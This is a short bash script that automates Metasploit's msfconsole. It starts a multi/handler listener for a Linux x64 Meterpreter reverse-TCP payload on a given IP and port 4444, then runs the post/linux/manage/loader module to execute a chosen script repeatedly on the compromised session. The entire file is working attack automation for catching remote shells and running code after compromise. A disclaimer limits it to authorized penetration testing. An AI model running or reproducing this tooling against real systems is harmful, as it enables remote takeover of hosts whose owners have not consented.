#!/bin/bash

# meterpreter.sh
#
# This script automates the process of launching Metasploit's msfconsole, setting up a reverse TCP Meterpreter payload, 
# and executing a post-exploitation script with specified parameters.
#
# Usage:
#   ./meterpreter.sh <script_name> <iteration_count> <ip_address>
#
# Arguments:
#   script_name      - The name of the script to be executed in the post-exploitation phase.
#   iteration_count  - The number of iterations to run the specified script.
#   ip_address       - The IP address to be used as the LHOST for the reverse TCP connection.
#
# Functionality:
#   1. Opens a new terminal window and launches msfconsole.
#   2. Configures the multi/handler exploit with the linux/x64/meterpreter/reverse_tcp payload.
#   3. Sets the LHOST and LPORT for the reverse TCP connection.
#   4. Executes the exploit in the background to establish a Meterpreter session.
#   5. Runs the post/linux/manage/loader module with the specified script and iteration count.
#   6. Closes the msfconsole session and exits the script.
#
# Prerequisites:
#   - Metasploit Framework must be installed and accessible via the `msfconsole` command.
#   - The `gnome-terminal` command must be available for opening a new terminal window.
#   - Ensure the provided script and IP address are valid and accessible.
#
# Note:
#   - This script is intended for educational and authorized penetration testing purposes only.
#   - Unauthorized use of this script may violate laws and regulations.

# Arguments from Meterpreter
script="$1"
iteration="$2"
ip="$3"

# Open a new terminal and execute the commands in msfconsole
gnome-terminal --wait -- bash -c "
echo 'Launching msfconsole...';

# Start msfconsole, set up the exploit and payload, then invoke the loader.rb script for the iteration
msfconsole -q -x '
use exploit/multi/handler;   
set payload linux/x64/meterpreter/reverse_tcp;
set LHOST $ip;
set LPORT 4444;
exploit -j;
sleep 3;
use post/linux/manage/loader;
set SESSION 1;
set SCRIPT_NAME $script;
set ITERATION_COUNT $iteration;
run;
exit -y;
';

echo 'Meterpreter session closed.';
"

sleep 2
exit 0
